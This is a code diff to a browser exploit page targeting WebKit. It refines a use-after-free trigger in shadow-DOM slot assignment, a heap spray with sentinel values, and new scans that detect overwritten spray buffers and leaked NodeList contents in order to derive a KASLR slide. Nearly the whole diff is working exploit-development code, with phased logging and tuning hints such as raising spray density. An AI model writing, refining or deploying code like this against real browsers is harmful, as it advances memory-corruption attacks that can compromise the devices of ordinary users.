@@ -1008,8 +1008,13 @@ function uafTrigger({ host, targetSlot, pumps }) {
   // Reassign → slotManualAssignmentDidChange → render teardown → re-entry
   // → m_slots.ensure() → WeakHashMap amortized cleanup → rehash
   // → freed bucket array → stale effectiveCurrent ptr read-after-free
-  targetSlot.assign(host.appendChild(document.createElement('span')));
+  // Capture assignedNodes() return DURING the reassign to catch stale-read leak
+  const newChild = host.appendChild(document.createElement('span'));
+  targetSlot.assign(newChild);
+  // assignedNodes() here reads from possibly-freed bucket in JSC binding layer
+  const nodes = targetSlot.assignedNodes({ flatten: false });
   host.remove();
+  return nodes;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1021,11 +1026,12 @@ function uafTrigger({ host, targetSlot, pumps }) {
 function heapSpray(sprayHexList) {
   const SPRAY_SIZE = 64;
   const PER_ADDR   = 8;
-  const sprays     = [];
+  const sprays     = [];   // { buf, u32, addrLo, addrHi, k, j }
   const addrs      = sprayHexList.slice(0, 128);
   for (let k = 0; k < addrs.length; k++) {
-    const addrLo = parseInt(addrs[k], 16) & 0xFFFFFFFF;
-    const addrHi = (parseInt(addrs[k], 16) / 0x100000000) >>> 0;
+    const addrVal = parseInt(addrs[k], 16);
+    const addrLo  = addrVal & 0xFFFFFFFF;
+    const addrHi  = Math.floor(addrVal / 0x100000000) >>> 0;
     for (let j = 0; j < PER_ADDR; j++) {
       const buf = new ArrayBuffer(SPRAY_SIZE);
       const v   = new DataView(buf);
@@ -1035,11 +1041,43 @@ function heapSpray(sprayHexList) {
       v.setUint32(12, 0xBEEF0000 | j,    true);
       for (let i = 16; i < SPRAY_SIZE; i += 4)
         v.setUint32(i, 0xCAFEBABE, true);
-      sprays.push(buf);
+      // Keep a Uint32Array view so we can scan post-trigger for clobber detection
+      sprays.push({ buf, u32: new Uint32Array(buf), addrLo, addrHi, k, j });
     }
   }
   log(`[SPRAY] ${sprays.length} objects x ${SPRAY_SIZE}B = ${(sprays.length*SPRAY_SIZE/1024).toFixed(1)}KB`);
   return sprays;
+}
+
+// Scan spray bufs for clobber: any buf whose discriminator words got overwritten
+// means the freed WeakHashMap bucket array landed on top of our spray.
+function scanSprayClobber(sprays) {
+  const hits = [];
+  for (const s of sprays) {
+    const u = s.u32;
+    // Our sentinel: [0]=addrLo [1]=addrHi [2]=0xDEAD0000|k [3]=0xBEEF0000|j [4..]=0xCAFEBABE
+    // A clobber shows as ANY word in [2..15] != expected (bucket data got written here)
+    const sentinel2 = (0xDEAD0000 | s.k) >>> 0;
+    const sentinel3 = (0xBEEF0000 | s.j) >>> 0;
+    if (u[2] !== sentinel2 || u[3] !== sentinel3) {
+      hits.push({
+        addrLo: s.addrLo, addrHi: s.addrHi, k: s.k, j: s.j,
+        got2: u[2], got3: u[3],
+        raw: Array.from(u).map(x => x.toString(16).padStart(8,'0')).join(' ')
+      });
+    }
+  }
+  return hits;
+}
+
+// Check assignedNodes() return for anomalies:
+// Expected post-assign: length=1, only the newChild we just assigned.
+// Stale-pointer read from freed bucket can return wrong length or foreign nodes.
+function checkNodeLeak(nodes, expectedNode) {
+  if (!nodes) return null;
+  if (nodes.length !== 1) return { anomaly: 'length', len: nodes.length };
+  if (nodes[0] !== expectedNode) return { anomaly: 'identity', got: nodes[0] };
+  return null;
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -1073,7 +1111,7 @@ function heapSpray(sprayHexList) {
   log('\n[*] Phase 2: Heap spray at oracle candidates...');
   await new Promise(r => setTimeout(r, 100));
 
-  const sprayRef = heapSpray(sprayHex); // keep alive
+  const sprayRef = heapSpray(sprayHex); // array of {buf,u32,addrLo,addrHi,k,j} — keep alive
   await new Promise(r => setTimeout(r, 100));
   log('[*] Spray in place');
 
@@ -1096,33 +1134,95 @@ function heapSpray(sprayHexList) {
   // Force layout — every host needs a renderer for tearDownRenderersAfterSlotChange
   document.body.offsetHeight;
 
-  // ─── Phase 4: Trigger ────────────────────────────────────────────────────
+  // ─── Phase 4: Trigger + Instrument ──────────────────────────────────────
   log('\n[*] Phase 4: Triggering UAF...');
-  log('[*] Expected: WeakHashMap rehash → freed bucket → stale read from spray region');
+  log('[*] Instrumentation: NodeList anomaly check + post-trigger spray clobber scan');
 
-  let uafHits = 0;
+  let uafExceptions = 0;
+  let nodeAnomalies = 0;
+  const nodeAnomalyLog = [];
   const t0 = performance.now();
+
   for (const c of cases) {
     try {
-      uafTrigger(c);
+      const { host, targetSlot, pumps } = c;
+      // Pump to threshold
+      for (let i = 0; i < pumps; ++i) targetSlot.assignedNodes();
+      // Trigger reassign + capture stale read
+      const newChild = host.appendChild(document.createElement('span'));
+      targetSlot.assign(newChild);
+      const nodes = targetSlot.assignedNodes({ flatten: false });
+      host.remove();
+      // Check NodeList for anomaly (stale bucket data leaking into JS)
+      const anomaly = checkNodeLeak(nodes, newChild);
+      if (anomaly) {
+        nodeAnomalies++;
+        if (nodeAnomalyLog.length < 20)
+          nodeAnomalyLog.push(`pumps=${pumps} anomaly=${JSON.stringify(anomaly)}`);
+      }
     } catch (e) {
-      uafHits++;
-      log(`[!!!] UAF exception: ${e.message || e} (hit #${uafHits})`);
+      uafExceptions++;
+      if (uafExceptions <= 5)
+        log(`[!!!] UAF exception (hit #${uafExceptions}): ${e.message || e}`);
     }
   }
   const elapsed = (performance.now() - t0).toFixed(1);
+
+  // ─── Phase 5: Post-trigger spray clobber scan ────────────────────────────
+  log('\n[*] Phase 5: Scanning spray buffers for clobber (freed bucket reuse)...');
+  await new Promise(r => setTimeout(r, 50)); // let allocator settle
+  const clobbers = scanSprayClobber(sprayRef);
+
+  let confirmedSlide = null;
+  if (clobbers.length > 0) {
+    log(`[!!!] CLOBBER HITS: ${clobbers.length} spray bufs overwritten!`);
+    for (const h of clobbers.slice(0, 10)) {
+      const addrStr = (h.addrHi ? h.addrHi.toString(16).padStart(8,'0') : '') +
+                       h.addrLo.toString(16).padStart(8,'0');
+      log(`[!!!]   addr=0x${addrStr} k=${h.k} j=${h.j}`);
+      log(`[!!!]   raw: ${h.raw}`);
+    }
+    // Best candidate: most-clobbered address = bucket array landed there = that IS our heap
+    const freq = {};
+    for (const h of clobbers) {
+      const key = h.addrLo.toString(16);
+      freq[key] = (freq[key] || 0) + 1;
+    }
+    const best = Object.entries(freq).sort((a,b)=>b[1]-a[1])[0];
+    const bestAddr = parseInt(best[0], 16);
+    log(`[!!!] BEST CANDIDATE addr=0x${bestAddr.toString(16)} (${best[1]} clobbers)`);
+    // Cross-reference with spray list to derive KASLR slide
+    const idx = sprayHex.findIndex(h => parseInt(h,16) === bestAddr);
+    if (idx >= 0) {
+      log(`[!!!] SPRAY INDEX ${idx} → oracle offset 0x${bestAddr.toString(16)}`);
+      log(`[!!!] KASLR SLIDE = WebKit base + 0x${bestAddr.toString(16)}`);
+      confirmedSlide = bestAddr;
+    }
+  } else {
+    log('[*] No clobber detected — UAF bucket reuse did not overlap spray region this run');
+    log('[*] Try: increase spray density (PER_ADDR), tighten ghost/pump sweep, or re-run');
+  }
+
+  if (nodeAnomalies > 0) {
+    log(`\n[!!!] NODE ANOMALIES: ${nodeAnomalies} UAF cases returned unexpected NodeList`);
+    nodeAnomalyLog.forEach(l => log(`[!!!]   ${l}`));
+  }
 
   // ─── Summary ─────────────────────────────────────────────────────────────
   log(`\n${'═'.repeat(60)}`);
   log('RESULT SUMMARY');
   log('═'.repeat(60));
-  log(`Oracle:      ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
-  log(`Spray:       ${sprayRef.length} objects @ 64B = ${(sprayRef.length*64/1024).toFixed(1)}KB`);
-  log(`UAF cases:   ${cases.length} (ghosts 20-100, pumps 1-3x)`);
-  log(`UAF time:    ${elapsed}ms`);
-  log(`Exceptions:  ${uafHits} (potential UAF reads hitting spray)`);
+  log(`Oracle:       ${sprayHex.length} spray addrs, HIGH=${highConf.length} candidates`);
+  log(`Spray:        ${sprayRef.length} objects @ 64B = ${(sprayRef.length*64/1024).toFixed(1)}KB`);
+  log(`UAF cases:    ${cases.length} (ghosts 20-100, pumps 1-3x)`);
+  log(`UAF time:     ${elapsed}ms`);
+  log(`Exceptions:   ${uafExceptions}`);
+  log(`Node anomaly: ${nodeAnomalies}`);
+  log(`Clobber hits: ${clobbers.length}`);
+  log(`Slide:        ${confirmedSlide !== null ? '0x'+confirmedSlide.toString(16)+' ✓ CONFIRMED' : 'not yet confirmed'}`);
   log('═'.repeat(60));
-  log('[*] Next: instrument UAF read bytes → discriminator match → exact slide');
+  if (confirmedSlide === null)
+    log('[*] Next: increase PER_ADDR spray density or widen ghost/pump sweep');
 })();
 
 </script>
